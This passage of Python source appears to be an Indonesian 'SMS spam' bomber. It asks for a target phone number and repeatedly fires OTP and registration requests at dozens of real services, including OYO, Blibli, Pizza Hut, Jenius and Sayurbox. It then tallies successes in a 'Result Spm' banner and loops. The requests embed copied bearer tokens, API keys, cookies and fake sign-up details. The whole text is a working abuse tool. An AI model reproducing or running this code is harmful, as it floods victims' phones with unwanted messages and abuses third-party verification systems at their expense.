            why=requests.post("https://www.misteraladin.com/api/members/v2/otp/request",headers={'Host':'www.misteraladin.com','content-length':'81','sec-ch-ua':'"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','accept-language':'id','sec-ch-ua-mobile':'?0','authorization':'Bearer null','content-type':'application/json;charset=UTF-8','accept':'application/json, text/plain, */*','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36','x-platform':'web','sec-ch-ua-platform':'"Linux"','origin':'https://www.misteraladin.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.misteraladin.com/register','accept-encoding':'gzip, deflate, br',},data=json.dumps({"phone_number_country_code":"62","phone_number":nomor,"type":"register"})).text
            poll=requests.post("https://api.myfave.com/api/fave/v3/auth",headers={'Host':'api.myfave.com','Connection':'keep-alive','Content-Length':'26','sec-ch-ua':'"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','x-user-agent':'Fave-PWA/v1.0.0','content-type':'application/json','sec-ch-ua-mobile':'?1','User-Agent':'Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'"Android"','Accept':'*/*','Origin':'https://myfave.com','Sec-Fetch-Site':'same-site','Sec-Fetch-Mode':'cors','Sec-Fetch-Dest':'empty','Referer':'https://myfave.com/','Accept-Encoding':'gzip, deflate, br','Accept-Language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},data=json.dumps({"phone":"+62"+nomor})).text
            reqi=requests.post("https://auth.sampingan.co/v1/otp",data=json.dumps({"channel":"WA","country_code":"+62","phone_number":nomor}),headers={"Host":"auth.sampingan.co","domain-name":"auth-svc","app-auth":"Skip","content-type":"application/json; charset=UTF-8","user-agent":"okhttp/4.9.1","accept":"application/vnd.full+json","accept":"application/json","content-type":"application/vnd.full+json","content-type":"application/json","app-version":"2.1.2","app-platform":"Android"}).text
            pospp=requests.post("https://wapi.ruparupa.com/auth/generate-otp",headers={"Host":"wapi.ruparupa.com","content-length":"120","sec-ch-ua-mobile":"?0","authorization":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiYTQyNDMyZDctZjI5NS00Zjk0LTllYTYtZjlkZmM0ZDgwY2RiIiwiaWF0IjoxNjU3MTI0OTQwLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.4j37JW_U6DVynJ0wCxHmVNI8SbpsaeUgqk3SEihJmvs","content-type":"application/json","x-company-name":"odi","accept":"application/json","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Safari/537.36","user-platform":"desktop","x-frontend-type":"desktop","sec-ch-ua-platform":"Linux","origin":"https://www.ruparupa.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.ruparupa.com/verification?page=otp-choices","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":"0"+nomor,"action":"register","channel":"message","email":"","token":"","customer_id":"0","is_resend":0})).text
            done = 0
            die = 0
            if "errors" in tod:
                done += 1
            else:
                die += 1
            if "Send successfully" in ksjs:
                done += 1
            else:
                die += 1
            if "<Response [200]>" in sending:
                done += 1
            else:
                die += 1
            if "OTP_SENT" in gas:
                done += 1
            else:
                die += 1
            if "Evermos OTP" in Arifa:
                done += 1
            else:
                die += 1
            if "Success to register account data" in alokpos:
                done += 1
            else:
                die += 1
            if "AuthIDResponseType" in ken:
                done += 1
            else:
                die += 1
            if "Kode verifikasi berhasil dikirimkan" in rupa:
                done += 1
            else:
                die += 1
            if "Success" in possing:
                done += 1
            else:
                die += 1
            if "!" in reqiu:
                done += 1
            else:
                die += 1
            if "Berhasil melakukan registrasi user." in leceh:
                done += 1
            else:
                die += 1
            if "SUCCESSFULLY GENERATED OTP " in yoyo:
                done += 1
            else:
                die += 1
            if "OK" in moka:
                done += 1
            else:
                die += 1
            if "PENDING" in AmmarGanz:
                done += 1
            else:
                die += 1
            if "success" in map:
                done += 1
            else:
                die += 1
            if "ok" in dekor2:
                done += 1
            else:
                die += 1
            if "ForgeRockTokensResult" in jenius:
                done += 1
            else:
                die += 1
            if "success" in req3:
                done += 1
            else:
                die += 1
            if "!" in pizzahut:
                done += 1
            else:
                die += 1
            if "OK" in bli:
                done += 1
            else:
                die += 1
            if "If your phone number is not registered, you will receive an OTP" in ha:
                done += 1
            else:
                die += 1
            if "Send successfully" in pos:
    	        done += 1
            else:
    	        die += 1
            if "Evermos OTP" in req:
    	        done += 1
            else:
    	        die += 1
            if "<Response [200]>" in response:
    	        done += 1
            else:
	            die += 1
            if "MESSAGE_SENT" in singsing:
	            done += 1
            else:
    	        die += 1
            if "success create accounts" in posting:
    	        done += 1
            else:
    	        die += 1
            if "AuthIDResponseType" in ammar_gamteng:
                done += 1
            else:
	            die += 1
            if "FailedPrecondition" in kum:
    	        die += 1
            else:
    	        done += 1
            if "send international sms success" in poss:
    	        done += 1
            else:
                die += 1
            if "error" in why:
    	        die += 1
            else:
    	        done += 1
            if "We can't process your request now. Please try again later or contact customer support." in poll:
    	        die += 1
            else:
    	        done += 1
            if "BAD_REQ" in reqi:
    	        die += 1
            else:
    	        done += 1
            if "Kode verifikasi berhasil dikirimkan" in pospp:
                done += 1
            else:
    	        die += 1
            print (f"{U}┌───────────────────────────────────── {putih}Result Spm {U}─────────────────────────────────────┐")
            print (f"{U}│ {Y}• {putih}Target Number {R}:{H} +62{nomor}                                   ")
            print (f"{U}│ {Y}• {putih}Your Ip       {R}:{H} {ip}                                         ")
            print (f"{U}│ {Y}• {putih}Time          {R}:{H} {localtime}                                  ")
            print (f"{U}└───┬──────────────────────────────────────────────────────────────────────────────────┘")
            print (f"{Y}    ├──{R}▶{putih} Total Success {B}:{H} ",done)
            print (f"{Y}    ╰──{R}▶{putih} Total Denied  {B}:{R} ",die)
            countdown(90)
    except KeyboardInterrupt:
            tanya()
    except requests.exceptions.ConnectionError:
        print (f"   {R}Error!! {putih}not connected to the network")
        tanya()

def sms():
    try:
        ip=requests.get('https://api.ipify.org').text
        localtime=localtime=time.asctime(time.localtime(time.time()))
        nomor=input(f"{putih}   [{Y}•{putih}] Target Number {putih}({Y}8xx{putih}) {R}:{H} ")
        while True:
            yoyo = requests.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id",headers={"Host": "identity-gateway.oyorooms.com","consumer_host": "https://www.oyorooms.com","accept-language": "id","access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=","User-Agent":"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36","Content-Type": "application/json","accept": "*/*","origin": "https://www.oyorooms.com","referer": "https://www.oyorooms.com/login","Accept-Encoding": "gzip, deflate, br"},data=json.dumps({"phone":f"0"+nomor,"country_code": "+62","country_iso_code": "ID","nod": "4","send_otp": "true","devise_role": "Consumer_Guest"})).text
            moka = requests.post("https://service.mokapos.com/account/v1/verification/phone/send",headers={  "accept": "application/json, text/plain, */*","authorization": "undefined","save-data": "on","user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J500M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},data=json.dumps({"phone_number":f"+62"+nomor})).text
            AmmarGanz=requests.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps({"grantType": "retry","method": "sms","phone":"62"+nomor,"language": "id"}), headers={"accept": "*/*","x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=","x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","content-type": "application/json"}).text
            map=requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp",headers={"Host":"beryllium.mapclub.com","content-type":"application/json","accept-language":"en-US","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","origin":"https://www.mapclub.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.mapclub.com/","accept-encoding":"gzip, deflate, br"},data=json.dumps({"account":nomor})).text
            dekor2=requests.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",headers={"Host":"auth.dekoruma.com","save-data":"on","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","origin":"https://m.dekoruma.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.dekoruma.com/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phoneNumber":"+62"+nomor,"platform":"sms"})).text
            jenius=requests.post("https://api.btpn.com/jenius", json.dumps({"query": "mutation registerPhone($phone: String!,$language: Language!) {\n  registerPhone(input: {phone: $phone,language: $language}) {\n    authId\n    tokenId\n    __typename\n  }\n}\n","variables": {"phone":"+62"+nomor,"language": "id"},"operationName": "registerPhone"}),headers={"accept": "*/*","btpn-apikey": "f73eb34d-5bf3-42c5-b76e-271448c2e87d","version": "2.36.1-7565","accept-language": "id","x-request-id": "d7ba0ec4-ebad-4afd-ab12-62ce331379be","Content-Type": "application/json","Host": "api.btpn.com","Connection": "Keep-Alive","Accept-Encoding": "gzip","Cookie": "c6bc80518877dd97cd71fa6f90ea6a0a=24058b87eb5dac1ac1744de9babd1607","User-Agent": "okhttp/3.12.1"}).text
            req3 = requests.post('https://www.alodokter.com/login-with-phone-number', headers={'Host': 'www.alodokter.com','content-length': '33','x-csrf-token': 'UG8hv2kV0R2CatKLXYPzT1isPZuGHVJi8sjnubFFdU1YvsHKrmIyRz6itHgNYuuBbbgSsCmfJWktrsfSC9SaGA==','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/json','accept': 'application/json','save-data': 'on','origin': 'https://www.alodokter.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.alodokter.com/login-alodokter','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'},data=json.dumps({"user": {"phone": "0"+nomor}})).text
            pizzahut=requests.post('https://api-prod.pizzahut.co.id/customer/v1/customer/register', headers={'Host': 'api-prod.pizzahut.co.id','content-length': '157','x-device-type': 'PC','sec-ch-ua-mobile': '?1','x-platform': 'WEBMOBILE','x-channel': '2','content-type': 'application/json;charset=UTF-8','accept': 'application/json','x-client-id': 'b39773b0-435b-4f41-80e9-163eef20e0ab','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','x-lang': 'en','save-data': 'on','x-device-id': 'web','origin': 'https://www.pizzahut.co.id','sec-fetch-site': 'same-site','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.pizzahut.co.id/','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'},data=json.dumps({  "email": "aldigg088@gmail.com",  "first_name": "Xenzi",  "last_name": "Wokwokw",  "password": "Aldi++\\/67",  "phone": "0"+nomor,  "birthday": "2000-01-02"})).text
            bli=requests.post("https://www.blibli.com/backend/common/users/_request-otp",headers={"Host":"www.blibli.com","content-length":"27","accept":"application/json, text/plain, */*","content-type":"application/json;charset=UTF-8","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","sec-ch-ua-platform":"Android","origin":"https://www.blibli.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.blibli.com/login?ref=&logonId=0"+nomor,"accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"username":"0"+nomor})).text
            ha=requests.post("https://pluang.com/api/user/register/send-otp",headers={'Host':'pluang.com','content-length':'112','sec-ch-ua':'"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile':'?1','user-agent':'Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'Android','content-type':'application/json','accept':'*/*','origin':'https://pluang.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://pluang.com/register','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},cookies={"cookie":"_gcl_au=1.1.634793654.1661960345","cookie":"_ga=GA1.2.217955334.1661960346","cookie":"_gid=GA1.2.1904059940.1661960346","cookie":"_gat_gtag_UA_124743364_3=1","cookie":"_fbp=fb.1.1661960347395.1573571703","cookie":"environment=production","cookie":"language=in","cookie":"WZRK_G=abf62dd1bf5f41edaa930f04872d1884","cookie":"cebs=1","cookie":"_tt_enable_cookie=1","cookie":"_ttp=ef83fe23-1e62-4741-9339-c077fd6d2076","cookie":"WZRK_S_R57-4Z9-9W6Z=%7B%22p%22%3A1%2C%22s%22%3A1661960351%2C%22t%22%3A1661960350%7D","cookie":"cebsp=1","cookie":"_ce.s=v~2dbcd906fa5fb9b378ebbd2642a150297d12fd70~vpv~0~v11slnt~1661960352042","cookie":"_ga_3RX02MCRS0=GS1.1.1661960345.1.1.1661960362.43.0.0","cookie":"_ga_824G2HJWD9=GS1.1.1661960346.1.1.1661960362.0.0.0","cookie":"_ga_EHTZ6P30C7=GS1.1.1661960346.1.1.1661960362.0.0.0","cookie":"_ga_ZXS1PKZ40M=GS1.1.1661960346.1.1.1661960362.0.0.0"},data=json.dumps({"name":"Shshshiskabzbz","email":"ammarexecuted@gmail.com","phone":"0"+nomor,"csrfToken":"pluangCsrfToken"})).text
            pos=requests.post("https://www.carsome.id/website/login/sendSMS",headers={"Host":"www.carsome.id","content-length":"38","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type":"application/json","accept":"application/json, text/plain, */*","country":"ID","x-amplitude-device-id":"s6abXpSHh6_mTsxfvOynJM","sec-ch-ua-platform":"Android","origin":"https://www.carsome.id","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.carsome.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"username":nomor,"optType":0})).text
            req=requests.post("https://evermos.com/api/register/phone-registration",headers={"Host":"evermos.com","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","origin":"https://evermos.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://evermos.com/registration/otp","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":"62"+nomor})).text
            head={    'authority': 'www.oto.com',    'accept': 'application/json, text/javascript, */*; q=0.01',    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',    'origin': 'https://www.oto.com',    'referer': 'https://www.oto.com/ovb/user-login',    'sec-ch-ua': '"Chromium";v="105", "Not)A;Brand";v="8"',    'sec-ch-ua-mobile': '?0',    'sec-ch-ua-platform': '"Linux"',    'sec-fetch-dest': 'empty',    'sec-fetch-mode': 'cors',    'sec-fetch-site': 'same-origin',    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',    'x-requested-with': 'XMLHttpRequest',}
            response = requests.post('https://www.oto.com/ovb/send-otp', params={    'lang': 'id',}, cookies={    'primary_utm_campaign': 'organic',    'primary_utm_medium': 'organic',    'primary_utm_source': 'yahoo',    'utm_campaign': 'organic',    'utm_medium': 'organic',    'utm_source': 'yahoo',    'landing_url': 'https%3A%2F%2Fwww.oto.com%2F',    '_csrf': 'aG2nJALlO7VyltTb-atrM-_EXaThOQri',    'GCLB': 'CPH61KyGt9yB2wE',    '_gcl_au': '1.1.60394401.1662191705',    '_pbjs_userid_consent_data': '3524755945110770',    'pbjs-pubCommonId': '0c3d7536-4c41-4e8c-8078-ede03a294dfe',    '_ga': 'GA1.2.1220515766.1662191705',    '_gid': 'GA1.2.525526430.1662191705',    '_gat': '1',    '_co_session_active': '1',    '_CO_anonymousId': '65ad5b8b-31fe-0728-c3ce-e208c717c122',    '_CO_type': 'connecto',    '_fbp': 'fb.1.1662191705704.1893770966',    '_dc_gtm_UA-58094033-8': '1',    '_lr_retry_request': 'true',    '_lr_env_src_ats': 'false',    '__gads': 'ID=0d3fa2b6107a5244:T=1662191707:S=ALNI_MbMDDAdViTY4nYB086vSjMp8axBUw',    '__gpi': 'UID=0000096baa896e74:T=1662191707:RT=1662191707:S=ALNI_MbpMPTZyUO8x5wnAh3T1Qq5rVKPDw',    'pubmatic-unifiedid': '%7B%22TDID%22%3A%22b8d808f8-e3d6-4b01-bfb5-34a077fe952a%22%2C%22TDID_LOOKUP%22%3A%22TRUE%22%2C%22TDID_CREATED_AT%22%3A%222022-08-03T07%3A55%3A08%22%7D',    'panoramaId_expiry': '1662796507670',    '_cc_id': 'a270b7341af8c173e8f2aa3f71b7accd',    'panoramaId': '3cc178a793a7f2c651c73fe7475c16d53938dce698845cc3fb7fea782d2fbcf3',    'pbjs_debug': '0',    'page_view': '1',    'cto_bidid': 'ilf0CV9KN1ZCRzExY1NYMXNqVmclMkJlZ3k4azlIem9NbHhaa1pXYWlCQlhmJTJCVjdCMGhwOUhkRWV4UTNoOFhMbjVLaXpUT2JiN24yNEhCOER6RDZuVFVpSWpYdVElM0QlM0Q',    'cto_bundle': 'yx0Sy185U09IckR1WW4waUNkSmpoY1VFMGdVa2dZSk1VdEYlMkY2bSUyQmhDSG0lMkJ2ZFRUR0FPaG5nTHFrY1ZiQ2IzSGtodmE5dWExeDVNdllUcW1tMXFmMnQ2WUQwZVc1dEREaGJjZ1ZhVzlDZmpzWlQzayUzRA',}, headers=head, data={    'mobile': nomor,    'bookingId': '0',    'businessUnit': 'mobil',})
            singsing=requests.post("https://api.momobil.id/users/otp/send",headers={"Host":"api.momobil.id","Connection":"keep-alive","Content-Length":"39","sec-ch-ua-mobile":"?1","User-Agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform":"Android","Content-Type":"application/json","Accept":"*/*","Origin":"https://momobil.id","Sec-Fetch-Site":"same-site","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://momobil.id/","Accept-Encoding":"gzip, deflate, br","Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"to":"0"+nomor,"type":"register"})).text
            posting=requests.post("https://api.qoala.app/api/registrations",headers={"Host":"api.qoala.app","content-length":"202","accept":"application/json, text/plain, */*","content-type":"application/json;charset=UTF-8","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform":"Android","origin":"https://www.qoala.app","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.qoala.app/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"fullName":"Hsjsnsns","email":"ammarexecuted@gmail.com","phoneNumber":"+62"+nomor,"identityType":"KTP","nationality":"ID","password":"Abc167@ggwp","passwordConfirmation":"Abc167@ggwp","lang":"id"})).text
            last=json.dumps([{"operationName":"generateOTP","variables":{"destinationType":"sms","identity":"+62"+nomor},"query":"mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"}])
            ammar_gamteng=requests.post("https://www.sayurbox.com/graphql/v1?deduplicate=1",headers={'Host':'www.sayurbox.com','content-length':'284','sec-ch-ua':'"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','x-device-info':'{"platform":"web","is_app":false,"is_mobile":true,"device_type":"mobile","device_id":"LWUOU5jfEtY_43IsmFme_","os_name":"Android","os_version":"11","brand":null,"model":null,"client_ip":"::ffff:10.10.213.33","pixel_density":2}','sec-ch-ua-mobile':'?1','authorization':'eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNjYyMzc3NTA5LCJleHAiOjE2NjQ5Njk1MDksImlhdCI6MTY2MjM3NzUwOSwiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGx9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6IjFmOWE0NGI0LTE0MTgtNGIyNC1iYTRkLWU0MTEwN2FjOWU2NSIsInN1YiI6IjRwZUpiTjB5cUpuQkd4NDBfMGVWbWV1S3lkYWQiLCJ1c2VyX2lkIjoiNHBlSmJOMHlxSm5CR3g0MF8wZVZtZXVLeWRhZCJ9.jgaFjb95AibZL_GegkpMlRWkV1epP4zMUfSbCZEbY7BYwIQjBb3eZn8QVi8OMBn8ejYz1o3zn6JM0gRqFtiH1CsCwIyr9gSQuTwUn_pHhaJNE6-i2omxAA94MY8T7kHNyEV0kE50yx2-oT0gMWF2BWt65tUjFfV_29qx9RajFlV8z75iQ78JTtm595jd3--zWBrCyUzDy994w2Hwm5keGlBZuwDKPPofBPI7fsqMdouLIzjXVHrU5t_tA8Pij5QPqia9hW2W0BTlSSWc8wf6CELMKheFA3P8bvxlgCCVQ4WckdPH3iS_pglVAqeHW5z8nJxYnPKmvIzuPucoZlPyfg','content-type':'application/json','accept':'*/*','x-bundle-revision':'6.0','x-sbox-tenant':'sayurbox','x-binary-version':'2.2.1','user-agent':'Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'"Android"','origin':'https://www.sayurbox.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},data=last).text
            kum = requests.post("https://graphql-v4.kumparan.com/query",headers={"Host":"graphql-v4.kumparan.com","content-length":"179","accept":"*/*","content-type":"text/plain","env-client":"d52f487fa02230a23dbdc6e5a67545ddc59e4766d0a326d3f4a814b74ecc045e9382fed825b0d75ec7fa16588a50d75d","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform":"Android","origin":"https://m.kumparan.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.kumparan.com/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"operationName":"CreateOTPAndSendSMS","variables":{"phone":nomor},"query":"mutation CreateOTPAndSendSMS($phone: String!) {\n  CreateOTPAndSendSMS(phone: $phone)\n}\n"})).text
            poss = requests.post("https://ua.ctcorpmpc.com/blade-user/api/user/getotp",headers={"Host":"ua.ctcorpmpc.com","Connection":"keep-alive","Content-Length":"148","Blade-Auth":"Bearer 22222","sec-ch-ua-mobile":"?1","Authorization":"Basic c3dvcmQ6c3dvcmRfc2VjcmV0","Content-Type":"application/json;charset=UTF-8","User-Agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","X-requested-With":"XMLHttpRequest","Tenant-Id":"000000","sec-ch-ua-platform":"Android","Accept":"*/*","Origin":"https://ua.ctcorpmpc.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://ua.ctcorpmpc.com/cas-web/","Accept-Encoding":"gzip, deflate, br","Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phoneNo":nomor,"tplId":"4001001","tms":1662434407722,"requestId":"6e1b8c1c-fe2f-4418-851b-d31af02f0c221662434407722","intlPhoneCode":"62"})).text
            why=requests.post("https://www.misteraladin.com/api/members/v2/otp/request",headers={'Host':'www.misteraladin.com','content-length':'81','sec-ch-ua':'"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','accept-language':'id','sec-ch-ua-mobile':'?0','authorization':'Bearer null','content-type':'application/json;charset=UTF-8','accept':'application/json, text/plain, */*','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36','x-platform':'web','sec-ch-ua-platform':'"Linux"','origin':'https://www.misteraladin.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.misteraladin.com/register','accept-encoding':'gzip, deflate, br',},data=json.dumps({"phone_number_country_code":"62","phone_number":nomor,"type":"register"})).text
            poll=requests.post("https://api.myfave.com/api/fave/v3/auth",headers={'Host':'api.myfave.com','Connection':'keep-alive','Content-Length':'26','sec-ch-ua':'"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','x-user-agent':'Fave-PWA/v1.0.0','content-type':'application/json','sec-ch-ua-mobile':'?1','User-Agent':'Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'"Android"','Accept':'*/*','Origin':'https://myfave.com','Sec-Fetch-Site':'same-site','Sec-Fetch-Mode':'cors','Sec-Fetch-Dest':'empty','Referer':'https://myfave.com/','Accept-Encoding':'gzip, deflate, br','Accept-Language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},data=json.dumps({"phone":"+62"+nomor})).text
            reqi=requests.post("https://auth.sampingan.co/v1/otp",data=json.dumps({"channel":"WA","country_code":"+62","phone_number":nomor}),headers={"Host":"auth.sampingan.co","domain-name":"auth-svc","app-auth":"Skip","content-type":"application/json; charset=UTF-8","user-agent":"okhttp/4.9.1","accept":"application/vnd.full+json","accept":"application/json","content-type":"application/vnd.full+json","content-type":"application/json","app-version":"2.1.2","app-platform":"Android"}).text
            pospp=requests.post("https://wapi.ruparupa.com/auth/generate-otp",headers={"Host":"wapi.ruparupa.com","content-length":"120","sec-ch-ua-mobile":"?0","authorization":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiYTQyNDMyZDctZjI5NS00Zjk0LTllYTYtZjlkZmM0ZDgwY2RiIiwiaWF0IjoxNjU3MTI0OTQwLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.4j37JW_U6DVynJ0wCxHmVNI8SbpsaeUgqk3SEihJmvs","content-type":"application/json","x-company-name":"odi","accept":"application/json","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Safari/537.36","user-platform":"desktop","x-frontend-type":"desktop","sec-ch-ua-platform":"Linux","origin":"https://www.ruparupa.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.ruparupa.com/verification?page=otp-choices","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":"0"+nomor,"action":"register","channel":"message","email":"","token":"","customer_id":"0","is_resend":0})).text
            done = 0
            die = 0
            if "SUCCESSFULLY GENERATED OTP " in yoyo:
                done += 1
            else:
                die += 1
